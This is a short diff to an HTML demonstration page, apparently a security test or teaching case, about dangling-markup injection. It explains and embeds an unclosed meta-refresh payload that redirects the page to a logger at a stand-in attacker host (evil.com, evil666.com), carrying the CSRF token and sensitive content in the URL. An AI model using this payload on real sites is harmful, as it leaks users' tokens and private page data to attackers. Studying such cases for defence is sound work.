@@ -1,10 +1,12 @@
 <!-- applicability - if used in URL - will open a page along with csrf token-->
 
 <html>
-<h1> some title here </h1><br>
-There is a page<br>
-here is the broken input:<input name="test" value="hack">
-<meta http-equiv="refresh" content='0; url="http://evil666.com/logger.php?parameter=
+Unclosed meta tag<br>
+Suppose the attacker was able to inject the following into a vulnerable input: &quot;"&gt;&lt;meta http-equiv="refresh" content='15; url="http://evil.com/logger.php?log=<br>
+Once the page is opened - it will redirect itself along with the sensitive data.<br>
+<br>
+So here is the broken input after which some sensitive content goes on:<br>
+<input name="test" value="hack"><meta http-equiv="refresh" content='15; url="http://evil.com/logger.php?log=
 <br>
 some sensitive content<br>
 <form action=/action.php/>
